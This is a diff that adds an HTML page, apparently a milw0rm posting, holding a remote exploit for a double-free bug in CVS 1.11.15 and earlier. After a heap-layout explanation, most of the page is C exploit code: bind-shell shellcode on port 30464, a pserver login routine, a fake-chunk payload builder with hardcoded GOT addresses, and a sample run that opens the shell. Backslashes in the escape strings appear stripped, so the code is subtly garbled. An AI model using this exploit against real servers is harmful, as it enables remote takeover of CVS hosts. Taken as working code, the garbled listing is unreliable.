@@ -1,0 +1,471 @@
+<html>
+<head>
+<title>Remote CVS <= 1.11.15 error_prog_name double free vuln</title>
+<pre>
+* Remote CVS &lt;= 1.11.15 exploit for the error_prog_name double free vuln. 
+* 
+* by Gyan Chawdhary, gunnu45@hotmail.com 
+* 
+* Vulnerability Description: 
+* 
+* The Vulnerability lies in the serve_argumentx function. The Argumentx 
+command 
+* parameter is used to append data to a previously supplied Argument 
+command. 
+* These data pointers are stored in the argument_vector array. The 
+* serve_argumentx fails to check wether an Argument command is present in 
+the 
+* argument_vector and may append data to a pointer that should not get 
+* touched at all, in our case the *error_prog_name string. The function 
+calls 
+* realloc to create space for the new string. Because realloc will be called 
+* to store strlen(error_prog_name) + strlen(somedata) the original chunk 
+which 
+* just stores error_prog_name will get freed. This free chunk will once 
+again 
+* get freed after we disconnect from the CVS pserver. 
+* 
+* Theory: 
+* 
+* Sucessful exploitation depends heavily on a specific heap layout to be 
+met. 
+* The argument_vector is initialized for holding 3 ptrs. If more space is 
+* required it will call realloc. The error_prog_name string resides right 
+* after the argument_vector chunk. 
+* 
+* |11| arg_vector |11| error_prog_name |109| some chunk 
+* 
+* address of error_prog_name is stored in the argument_vector[0]. 
+* 
+* To achive sucessfull exploitation the following steps are performed. 
+* 
+* 1) Send Argumentx command with a large argument to reallocate 
+error_prog_name 
+* + large command on top of the heap. This will free the original 
+* error_prog_name buffer. 
+* 
+* 2) Send 50 Argument calls which will require the argument_vector array to 
+be 
+* reallocated freeing the current buffer. We keep this a high number to get 
+* mem from the top itself and to make the exploit reliable. As both the 
+* original the arg_vector &amp; err_prg_name buffers are free they are 
+* consolidated. Also we supply our fake chunk and shellcode in this call. 
+* 
+* 3) Send an argument command with the size &amp; prevsize as its arguments. 
+This 
+* will now be stored in arg_vector &amp; err_prg_name consolidated buffer. 
+* 
+* 4) Once we close the connection free will be called on the error_prog_name 
+* string which will read our fake size &amp; prev_size fields pointing to the 
+fake 
+* chunk , executing our shellcode. 
+* 
+* Phew !!!! 
+* 
+* NOTES: Iv tried this exp on RH 8 with glibc 2.3.*. This exp did NOT work 
+on 
+* my slack 8.0 cause of glibc 2.2 which creates a very different heap 
+layout. 
+* Also some tweaking will be required to use this exploit remotely as 
+sometimes 
+* the overwritten GOT does not execute due to early drop in the connection 
+.. 
+* Please someone figure it out n mail me :) .. 
+* 
+* Now the exploit 
+* 
+* FOR EDUCATIONAL PURPOSE ONLY FOR EDUCATIONAL PURPOSE ONLY FOR EDUCATIONAL 
+* PURPOSE ONLY FOR EDUCATIONAL PURPOSE ONLY FOR EDUCATIONAL PURPOSE ONLY FOR 
+* EDUCATIONAL PURPOSE ONLY FOR EDUCATIONAL PURPOSE ONLY FOR EDUCATIONAL 
+PURPOSE * 
+* Greets: jp - for his cool paper on advanced malloc exploits, and the 
+heapy.so 
+* jaguar@felinemenace - We at ... :P 
+* 
+* cya 
+* 
+* Gyan 
+*/ 
+
+#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt; 
+#include &lt;unistd.h&gt; 
+#include &lt;string.h&gt; 
+
+#include &lt;sys/socket.h&gt; 
+#include &lt;sys/types.h&gt; 
+#include &lt;netinet/in.h&gt; 
+
+char shellcode[] = 
+&quot;xebx18&quot; 
+&quot;AAAAAAAAAAAAAAAAAAAAAAAA&quot; 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;x31xdb&quot; // xorl %ebx,%ebx 
+&quot;x31xc9&quot; // xorl %ecx,%ecx 
+&quot;x31xd2&quot; // xorl %edx,%edx 
+&quot;xb0x66&quot; // movb $0x66,%al 
+&quot;xb3x01&quot; // movb $0x1,%bl 
+&quot;x51&quot; // pushl %ecx 
+&quot;xb1x06&quot; // movb $0x6,%cl 
+&quot;x51&quot; // pushl %ecx 
+&quot;xb1x01&quot; // movb $0x1,%cl 
+&quot;x51&quot; // pushl %ecx 
+&quot;xb1x02&quot; // movb $0x2,%cl 
+&quot;x51&quot; // pushl %ecx 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;xcdx80&quot; // int $0x80 
+
+/* port is 30464 !!! */ 
+/* bind(fd, (struct sockaddr)&amp;sin, sizeof(sin) ) */ 
+&quot;xb3x02&quot; // movb $0x2,%bl 
+&quot;xb1x02&quot; // movb $0x2,%cl 
+&quot;x31xc9&quot; // xorl %ecx,%ecx 
+&quot;x51&quot; // pushl %ecx 
+&quot;x51&quot; // pushl %ecx 
+&quot;x51&quot; // pushl %ecx 
+/* port = 0x77, change if needed */ 
+&quot;x80xc1x77&quot; // addb $0x77,%cl 
+&quot;x66x51&quot; // pushl %cx 
+&quot;xb1x02&quot; // movb $0x2,%cl 
+&quot;x66x51&quot; // pushw %cx 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;xb2x10&quot; // movb $0x10,%dl 
+&quot;x52&quot; // pushl %edx 
+&quot;x51&quot; // pushl %ecx 
+&quot;x50&quot; // pushl %eax 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;x89xc2&quot; // movl %eax,%edx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x66&quot; // movb $0x66,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* listen(fd, 1) */ 
+&quot;xb3x01&quot; // movb $0x1,%bl 
+&quot;x53&quot; // pushl %ebx 
+&quot;x52&quot; // pushl %edx 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x66&quot; // movb $0x66,%al 
+&quot;x80xc3x03&quot; // addb $0x3,%bl 
+&quot;xcdx80&quot; // int $0x80 
+
+/* cli = accept(fd, 0, 0) */ 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;x50&quot; // pushl %eax 
+&quot;x50&quot; // pushl %eax 
+&quot;x52&quot; // pushl %edx 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;xb3x05&quot; // movl $0x5,%bl 
+&quot;xb0x66&quot; // movl $0x66,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* dup2(cli, 0) */ 
+&quot;x89xc3&quot; // movl %eax,%ebx 
+&quot;x31xc9&quot; // xorl %ecx,%ecx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x3f&quot; // movb $0x3f,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* dup2(cli, 1) */ 
+&quot;x41&quot; // inc %ecx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x3f&quot; // movl $0x3f,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* dup2(cli, 2) */ 
+&quot;x41&quot; // inc %ecx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x3f&quot; // movb $0x3f,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* execve(&quot;//bin/sh&quot;, [&quot;//bin/sh&quot;, NULL], NULL); */ 
+&quot;x31xdb&quot; // xorl %ebx,%ebx 
+&quot;x53&quot; // pushl %ebx 
+&quot;x68x6ex2fx73x68&quot; // pushl $0x68732f6e 
+&quot;x68x2fx2fx62x69&quot; // pushl $0x69622f2f 
+&quot;x89xe3&quot; // movl %esp,%ebx 
+&quot;x8dx54x24x08&quot; // leal 0x8(%esp),%edx 
+&quot;x31xc9&quot; // xorl %ecx,%ecx 
+&quot;x51&quot; // pushl %ecx 
+&quot;x53&quot; // pushl %ebx 
+&quot;x8dx0cx24&quot; // leal (%esp),%ecx 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x0b&quot; // movb $0xb,%al 
+&quot;xcdx80&quot; // int $0x80 
+
+/* exit(%ebx) */ 
+&quot;x31xc0&quot; // xorl %eax,%eax 
+&quot;xb0x01&quot; // movb $0x1,%al 
+&quot;xcdx80&quot;; // int $0x80 
+
+void login(char *, char *, char *); 
+
+struct           sockaddr_in s; 
+int             sock; 
+
+void xp_connect(char *ip) 
+{ 
+        char buffer[1024]; 
+        char temp[1024]; 
+        int tmp; 
+
+        s.sin_family = AF_INET; 
+        s.sin_port = htons(2401); 
+        s.sin_addr.s_addr = inet_addr(ip); 
+
+        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) 
+        { 
+                printf(&quot;Cannot create socketn&quot;); 
+                exit(-1); 
+        } 
+
+        if((connect(sock,(struct sockaddr *)&amp;s,sizeof(struct sockaddr))) &lt; 
+0) 
+        { 
+                printf(&quot;Cannot connect()n&quot;); 
+                exit(-1); 
+        } 
+} 
+
+void xp_write(char *data) 
+{ 
+
+if(write (sock, data, strlen(data)) &lt; 0) 
+{ 
+printf(&quot;write() failedn&quot;); 
+exit(-1); 
+} 
+} 
+
+void xp_receive() 
+{ 
+int tmp; 
+char buffer[1024*2]; 
+
+if ( (tmp = read(sock, buffer, sizeof(buffer))) &lt;= 0) 
+{ 
+printf(&quot;read() failedn&quot;); 
+exit(-1); 
+} 
+printf(&quot;%s&quot;, buffer); 
+} 
+
+
+
+
+#define GOT_MEMCPY 0x80d2b4a 
+#define SHELL_ADDR 0x080cda20 
+
+char *egg(unsigned int what, unsigned int where) 
+{ 
+        char *ptr, *buf; 
+        int i=0; //dummy = 0xfffffffc; 
+        int size = strlen(shellcode); 
+
+        // Will contain our fake chunk supplided with our fd &amp; bk fields, 
+        // addr of shellcode &amp; got addr - 8 of free(). We will also try to 
+        // stuff in our shellcode in the same buffer as I dont have enough 
+        // gdb patience/time   to find nother controlable buffer :P 
+        buf = (char *)malloc(1250); 
+        ptr = buf; 
+
+        for (;i&lt;1248;) { 
+
+        *( (int **)ptr ) = (int *)( where - 8 ); 
+        ptr+=4; 
+        *( (int **)ptr ) = (int *)( what ); 
+        ptr+=4; 
+
+        i+=8; 
+        } 
+        buf[1250] = ''; 
+        ptr -= size; 
+strcpy(ptr, shellcode); 
+        ptr = buf; 
+        return ptr; 
+
+} 
+
+unsigned char shifts[] = { 
+      0,   1,   2,   3,   4,   5,   6,   7,   8,   9, 10, 11, 12, 13, 14, 15, 
+      16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 
+      114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87, 
+      111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105, 
+      41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35, 
+      125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56, 
+      36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48, 
+      58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223, 
+      225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190, 
+      199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193, 
+      174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212, 
+      207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246, 
+      192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176, 
+      227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127, 
+      182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195, 
+      243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152 }; 
+
+char   *scramble(char * str) 
+{ 
+    int                 i; 
+    char                 * s; 
+
+    s = (char *) malloc (strlen (str) + 3); 
+    memset(s, '', strlen(str) + 3); 
+    *s = 'A'; 
+    for (i = 1; str[i - 1]; i++) 
+    s = shifts[(unsigned char)(str[i - 1])]; 
+    return (s); 
+} 
+
+#define LOGIN &quot;BEGIN AUTH REQUESTn/home/cvsrootn%sn%snEND AUTH 
+REQUESTn&quot; 
+#define REQUEST &quot;Root %sn&quot; 
+
+void login(char *login, char *password, char *repo) 
+{ 
+char *buf, *ptr, reply[1024]; 
+char *rep, *rp; 
+buf = (char *)malloc(1024); 
+rep = (char *)malloc(512); 
+
+ptr = buf; 
+rp = rep; 
+sprintf(ptr, LOGIN, login, scramble(password)); 
+sprintf(rp, REQUEST, repo); 
+
+ptr = buf; 
+
+xp_write(ptr); /* login request */ 
+xp_receive(); 
+xp_write(rp); /* root dir request */ 
+
+
+} 
+
+char argumentx[] = &quot;Argumentx %sn&quot;; 
+char argument[] =   &quot;Argument %sn&quot;; 
+char trash[] = &quot;FCUK&quot;; 
+char str[] = &quot;Argument x42x42x42x42x6exffxffxffx1cxfcxffxff&quot; 
+    &quot;xf0xffxffxffx41x41n&quot;; 
+
+void overflow() 
+{ 
+  char *data, *dptr, *buf, *bufp, *eg, *arg, *aptr; 
+int i; 
+data = (char *)malloc(111111); 
+dptr = data; 
+buf = (char *)malloc(111111+20); 
+bufp = buf; 
+arg = (char *)malloc(1500); 
+aptr = arg; 
+
+
+memset(dptr, 'x41', 111111); 
+sprintf(bufp, argumentx, data); 
+xp_write(bufp); 
+
+eg = egg(0x80d2b4a, 0x080cda20); 
+sprintf(aptr, argument, eg); 
+
+for (i=0 ; i&lt;50; i++) 
+xp_write(aptr); 
+
+xp_write(str); 
+xp_write(trash); 
+} 
+
+
+
+void usage(char *name) 
+{ 
+printf(&quot;CVS &lt;= 1.11.15 Argumentx double free() remote exploit by Gyan&quot; 
+      &quot;Chawdhary (gunnu45@hotmail.com)n&quot; 
+              &quot;Usage: %s &lt;options&gt;n&quot; 
+      &quot;-i &lt;target IP address&gt;n&quot; 
+      &quot;-l &lt;login&gt;n&quot; 
+      &quot;-p &lt;password&gt;n&quot; 
+      &quot;-r &lt;repository path&gt;nn&quot;, name); 
+} 
+
+
+
+main(int argc, char **argv) 
+{ 
+int c; 
+char ip[16], user[32], pass[32], rep[512]; 
+
+ip[0] = 0; 
+user[0] = 0; 
+pass[0] = 0; 
+rep[0] = 0; 
+
+if (argc &lt; 2) { 
+usage(argv[0]); 
+exit(0); 
+} 
+
+while ((c = getopt(argc, argv, &quot;h::l:p:i:r:&quot;)) != -1) { 
+
+switch(c) { 
+
+case 'h': 
+usage(argv[0]); 
+exit(0); 
+case 'i': 
+strncpy(ip, optarg, sizeof(ip)); 
+break; 
+case 'l': 
+strncpy(user, optarg, sizeof(user)); 
+break; 
+case 'p': 
+strncpy(pass, optarg, sizeof(pass)); 
+break; 
+case 'r': 
+strncpy(rep, optarg, sizeof(rep)); 
+break; 
+} 
+} 
+
+if(ip) { 
+printf(&quot;Connecting to vulnerable CVS server ...&quot;); 
+xp_connect(ip); 
+printf(&quot;OKn&quot;); 
+} 
+
+        printf(&quot;Logging in ...&quot;); 
+        login(user, pass, rep); 
+printf(&quot;OKn&quot;); 
+
+      printf(&quot;Exploiting the CVS error_prog_name double free now ...&quot;); 
+      overflow(); 
+      printf(&quot;DONEn&quot;); 
+      printf(&quot;If everything went well there should be a shell on port 
+30464n&quot;); 
+} 
+
+
+
+
+
+//xp_connect(&quot;127.0.0.1&quot;); 
+//sleep(20); 
+//login(&quot;gyan&quot;, &quot;gyan&quot;); 
+//overflow(shellcode); 
+
+/* 
+
+[root@ill crazy]# ./free -i 127.0.0.1 -l gyan -p gyan -r /home/cvsroot 
+Connecting to vulnerable CVS server ...OK 
+Logging in ...I LOVE YOU 
+OK 
+Exploiting the CVS error_prog_name double free now ...DONE 
+If everything went well there should be a shell on port 30464 
+[root@ill crazy]# telnet 127.0.0.1 30464 
+Trying 127.0.0.1... 
+Connected to localhost.localdomain (127.0.0.1). 
+Escape character is '^]'. 
+
+*/ </pre>
+//milw0rm.com
+</html>
+
